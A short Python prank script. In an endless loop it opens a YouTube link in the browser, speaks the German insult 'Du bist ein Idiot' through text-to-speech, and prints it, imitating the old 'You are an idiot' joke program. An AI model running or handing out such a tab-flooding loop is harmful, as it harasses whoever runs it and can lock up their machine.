import webbrowser
import pyttsx3

def main():
    webbrowser.open("https://www.youtube.com/watch?v=GtL1huin9EE")

def tts():
    engine = pyttsx3.init()
    voices = engine.getProperty('voices')
    engine.setProperty('voice', voices[1].id)
    engine.setProperty('rate', 150)
    engine.setProperty('volume', 1.0)
    engine.say("Du bist ein Idiot")
    engine.runAndWait()

while True:
    main()
    tts()
    print("Du bist ein Idiot")